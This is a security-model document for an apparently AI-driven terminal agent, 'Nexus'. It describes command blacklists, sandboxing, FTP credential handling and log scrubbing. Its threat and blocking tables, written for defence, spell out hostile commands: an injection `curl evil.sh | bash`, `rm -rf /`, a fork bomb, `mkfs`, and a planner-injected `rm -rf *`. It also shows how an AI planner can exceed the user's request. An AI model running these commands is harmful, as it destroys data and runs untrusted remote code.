# Nexus — Security Model

> Defence-in-depth architecture for AI-generated command execution.

---

## Threat Model

| Attack Surface | Threat | Defence |
|---|---|---|
| **LLM-generated commands** | AI hallucinates a destructive command (`rm -rf /`) | AST parser + blacklist hard-blocks it before any execution |
| **Shell injection** | Crafted input turns a simple command into `cmd; curl evil.sh \| bash` | `shell=True` only enabled when genuine pipeline operators detected; otherwise `shlex.split()` list is used |
| **Sudo privilege abuse** | Cached password reused across untrusted commands | Password stored as `bytearray`, zeroed byte-by-byte on auth failure; never a plain Python string |
| **Unseen command execution** | Agent runs commands user never approved | Mandatory user confirmation gate on every execution; every decision logged to `~/.nexus/audit.log` |
| **Audit evasion** | Attacker covers tracks by deleting session data | Audit log is separate from session (`audit.log` vs `session.json`), `chmod 600`, append-only via Python logging |
| **API key leakage** | Keys logged in debug output or stack traces | No debug prints in production paths; keys read from env/config, never echoed |
| **Path escape on file read/write** | LLM points `FILE_READ` or CLI `read` at another user's home via prefix tricks | `Path.resolve()` + `relative_to` allowlist (home + cwd), not `str.startswith` on `/home/user` |
| **FTP secrets on CLI** | Model suggests `ftp://user:pass@...` or `wget --ftp-password=` | Risk-based FTP security: CRITICAL patterns blocked, HIGH-risk credential commands require confirmation, planner strips credentials and opens interactive sessions (see [FTP Security](#ftp-security) below) |
| **Indefinite hangs** | Malformed command hangs the subprocess forever | Configurable timeout (default 120s) on all `subprocess.run` calls |
| **Cascading API failures** | All LLM fallbacks slammed simultaneously on rate-limit | Exponential backoff with jitter between fallback attempts |

## Security Components

### Command Validation (`security.py`)

- **AST-Based Analysis**: Deep analysis of shell syntax to catch obfuscated attacks (e.g. `eval`, `cd / && rm -rf *`).
- **Strict blacklist**: Blocks `rm -rf /`, `mkfs`, fork bombs `:(){ :|:& };:`.
- **`rm -rf /` heuristics**: Horizontal-whitespace-aware patterns so `/tmp/...`, `/var/tmp/...`, and wrapped lines are not false positives.
- **Path allowlist** (`SafetyCheck.is_path_within_any_root`): CLI `read`, orchestrator `FILE_READ`, and home-scoped `FILE_WRITE` require resolved paths to lie under **home** and/or **cwd** using `Path.relative_to`.
- **FTP risk-based validation**: See [FTP Security](#ftp-security) below for the full risk model.

### Command Execution (`executor.py`)

- **Scoped `shell=True`**: Only activates when genuine pipeline operators (`&&`, `|`, `;`, `>`) are detected — prevents injection when the command is a simple binary call.
- **Zeroized sudo password**: Stored as `bytearray` in memory and byte-by-byte zeroed on auth failure — never held as a Python `str` that GC might retain.
- **Mandatory confirmation** for dangerous or `sudo` operations.
- **Persistent Audit Log** (`~/.nexus/audit.log`, chmod 600): Every executed, skipped, or rejected command is logged with timestamp, return code, user-confirmed Y/N, and stdout/stderr excerpts.
- **Dry-run mode**: `JARVIS_DRY_RUN=1` prevents any command execution.

### Azure Sandboxing (`AZURE_RUN`)

User-controlled cloud sandbox powered by Azure Container Instances. Nexus flags commands that fetch or execute external code and gives an explicit choice:

- **Trigger keywords:** `git clone`, `wget`, `curl`, `bash -c`, `sh -c`, `tar -x`, `make install`, `./configure`
- **Transport**: All sandboxed commands are UTF-8 base64-encoded and piped through `base64 -d | bash` in the container — prevents quoting bugs.
- **Preflight**: Refuses obviously incomplete one-liners (empty, bare `git`/`curl`/`wget`).
- **Lifecycle**: Container provisioned, command executed, output streamed, container deleted.

### File Operations Security

- **FILE_READ**: Paths must resolve under home or cwd via `Path.relative_to` (not `str.startswith`).
- **FILE_WRITE**: Home-directory paths use Python `write_text` (no sudo); system paths use `sudo mkdir -p` + `sudo tee`.
- **FILE_SEARCH**: Shell injection prevented via `shlex.quote()`.

### FTP Security

Nexus uses a risk-based execution model for FTP commands. Credentials must never appear in the command string — they are visible in `ps aux`, shell history (`~/.bash_history`), and system logs.

#### Risk Tiers

| Risk Level | Behavior | Patterns | Rationale |
|---|---|---|---|
| **CRITICAL** | Always blocked, never executes | `echo "pass" \| ftp`, `ftp ... <<EOF` | Broken by design: hangs in subprocess capture mode, leaks credentials in process list |
| **HIGH** | Blocked in auto-execution (`strict=True`), requires explicit user confirmation | `ftp://user:pass@host`, `lftp -u user,pass`, `--ftp-password=X`, anonymous FTP | Credentials embedded in CLI args — exposed in `ps aux`, shell history, audit logs |
| **LOW** | Auto-execute, safe | `lftp host`, `lftp -p 2121 host` | No credentials in command string |

#### Credential Exposure Vectors

Any credential passed as a CLI argument is exposed through:

1. **Process list** (`ps aux`) — any user on the system can see it while the command runs
2. **Shell history** (`~/.bash_history`, `~/.zsh_history`) — persists after session ends
3. **Audit logs** (`~/.nexus/audit.log`) — Nexus logs all executed commands
4. **System logs** — depending on OS config, may appear in syslog/journald

This applies equally to `ftp://user:pass@host`, `lftp -u user,pass`, `--ftp-password=X`, and `echo "pass" | ftp`.

#### Secure FTP Flow

When a user requests `open ftp://admin:1234@192.168.1.1`, Nexus follows this flow:

```
User input: "open ftp://admin:1234@192.168.1.1"
    │
    ├─ Decision Engine: detects ftp:// URL → routes to Planner
    │
    ├─ Planner: generates "lftp 192.168.1.1"
    │   └─ Credentials STRIPPED from command (never embedded in CLI)
    │
    ├─ Security Validator: no credentials in command → PASS (LOW risk)
    │
    ├─ Credential Scrubbing: input scrubbed before session/audit/memory storage
    │   └─ "ftp://admin:1234@host" → "ftp://***:***@host" in all logs
    │
    ├─ Orchestrator: detects lftp/ftp → forces run_interactive
    │   ├─ Shows: "⚠️ Credentials detected in input. For security, they
    │   │   won't be used automatically. Enter them interactively."
    │   └─ User gets a live TTY session
    │
    └─ User enters credentials at lftp prompt
        └─ Credentials never in shell history, ps aux, or logs
```

#### Credential Intent Awareness

When the user provides credentials in the URL (e.g. `ftp://admin:1234@host`), Nexus:

1. **Detects** the credentials in the original request
2. **Strips** them from the generated command
3. **Notifies** the user explicitly:
   ```
   ⚠️  Credentials detected in input.
   For security, they won't be used automatically.
   Enter them interactively at the lftp prompt.
   ```
4. Opens an **interactive session** where the user types credentials at the lftp prompt

This prevents confusion ("why didn't it use my password?") and builds trust by being transparent about the security decision.

#### FTP Retry Guard

FTP connection failures are handled differently from other TERMINAL failures:

| Property | FTP Commands | Other TERMINAL |
|---|---|---|
| Max heal attempts | 2 | 3 |
| Failure classification | Yes (network / auth / timeout / unknown) | No |
| User feedback | Shows classified failure type | Generic error output |

Failure classification helps users diagnose issues quickly:
- **network**: "Connection refused", "No route to host"
- **auth**: "Login incorrect", "Authentication failed"
- **timeout**: "Connection timed out"

#### Intent Downgrade Protection

The planner can introduce destructive actions that were **not** in the user's original request. This is a privilege escalation risk:

```
User says: "open ftp connection"
Planner generates: lftp -e "rm -rf *" host   ← NOT what user asked for
```

Nexus guards against this by scanning planned commands for destructive patterns (`rm -rf`, `mkfs`, `dd if=`, `DROP TABLE`, `git push --force`, `mdelete`, `mrm`, `glob rm`) and comparing against the original request. If destructive actions are introduced that weren't in the intent:

1. Shows an **Intent Escalation Detected** warning
2. Lists each escalated step with its destructive action
3. Requires explicit user confirmation (default: deny)

#### Credential Scrubbing (Logging Policy)

Credentials are scrubbed from **all** persistence layers before storage. The `scrub_credentials()` function in `security.py` redacts:

| Pattern | Before | After |
|---|---|---|
| `ftp://user:pass@host` | `ftp://admin:1234@192.168.1.1` | `ftp://***:***@192.168.1.1` |
| `lftp -u user,pass` | `lftp -u admin,secret 10.0.0.1` | `lftp -u ***,*** 10.0.0.1` |
| `user <name> <password>` | `lftp -e 'user admin 1234; ls'` | `lftp -e 'user *** ***; ls'` |
| `--ftp-password=X` | `--ftp-password=hunter2` | `--ftp-password=***` |
| `protocol://user:pass@` | `ssh://root:pass@10.0.0.1` | `ssh://***:***@10.0.0.1` |

Applied at these persistence points:

| Storage | File | What's scrubbed |
|---|---|---|
| **Session history** (`~/.nexus/session.json`) | `session_manager.py` | `user_input`, `intent_reasoning`, `result` |
| **Audit log** (`~/.nexus/audit.log`) | `audit_logger.py` | `command` in both `log()` and `log_skipped()` |
| **Memory/RAG** (Supermemory API) | `memory_client.py` | `content` and all `metadata` string values |

Credentials are scrubbed at the storage boundary, not at input time — so the planner and decision engine can still use the original input for routing decisions within a single session.

#### What Gets Blocked and Why

| Command | Risk | Verdict | Why |
|---|---|---|---|
| `lftp 192.168.1.1` | LOW | Auto-execute | No credentials exposed |
| `lftp -p 2121 host` | LOW | Auto-execute | No credentials exposed |
| `lftp -e 'ls; quit' host` | LOW | Auto-execute | No credentials or destructive ops |
| `lftp -u admin,1234 host` | HIGH | Blocked (auto) | Password in `ps aux` + history |
| `ftp://admin:1234@host` | HIGH | Blocked (auto) | Password embedded in URL |
| `--ftp-password=hunter2` | HIGH | Blocked (auto) | Password in flag |
| `curl -u anonymous ftp://host` | HIGH | Blocked (auto) | Anonymous FTP legacy risk |
| `lftp -e 'user admin 1234'` | CRITICAL | Always blocked | Credentials in `-e` command string |
| `lftp -e 'mdelete *; quit'` | CRITICAL | Always blocked | Destructive op must not be scripted |
| `lftp -e 'mrm dir/; quit'` | CRITICAL | Always blocked | Recursive delete via `-e` |
| `echo "1234" \| ftp host` | CRITICAL | Always blocked | Hangs + leaks credentials |
| `ftp host <<EOF` | CRITICAL | Always blocked | Hangs in subprocess capture |

#### Planner Rules

The tactical planner is instructed to:

1. **Never** embed credentials in FTP commands — not via `-u`, not via `-e 'user X Y'`, not in any form
2. **Always** use `lftp` (not basic `ftp`) — `lftp` handles interactive sessions properly
3. **Strip** credentials from `ftp://` URLs — generate `lftp host` only
4. **Never** use heredoc (`<<EOF`) or pipe (`echo | ftp`) patterns with FTP
5. **Never** script destructive ops via `-e` flag — `mdelete`, `mrm`, `rm`, `glob rm` must be done interactively
6. **Always** generate only `lftp host` — bare interactive session, nothing else

#### Implementation Files

| File | Responsibility |
|---|---|
| `src/jarvis/core/security.py` | `_FTP_BLOCKED_PATTERNS` (CRITICAL), `_FTP_DANGEROUS_PATTERNS` (HIGH), `scrub_credentials()` |
| `src/jarvis/core/orchestrator.py` | Planner prompt (credential-free FTP), TERMINAL handler (forces interactive + credential intent notice), retry guard (max 2 + failure classification), intent downgrade protection |
| `src/jarvis/ai/decision_engine.py` | Heuristic: detects `ftp://` URLs → routes to planner |
| `src/jarvis/core/session_manager.py` | Scrubs credentials before persisting to `session.json` |
| `src/jarvis/core/audit_logger.py` | Scrubs credentials before writing to `audit.log` |
| `src/jarvis/ai/memory_client.py` | Scrubs credentials before sending to Supermemory API |
| `tests/test_security.py` | `TestFtpSecurity`, `TestCredentialScrubbing` |

## Known Limitations

- Session file (`~/.nexus/session.json`) does not set `chmod 600` permissions. On multi-user machines, ensure proper home directory permissions (700). Fix is tracked in [FUTURE_SCOPE.md](FUTURE_SCOPE.md).

## Configuration

```bash
# Enable dry-run (no commands ever executed)
export JARVIS_DRY_RUN=1

# File locations
~/.nexus/audit.log      # Audit trail (chmod 600)
~/.nexus/session.json    # Session history
~/.config/nexus/config.json  # API keys + prefs (chmod 600)
```

---

*Updated: March 2026*
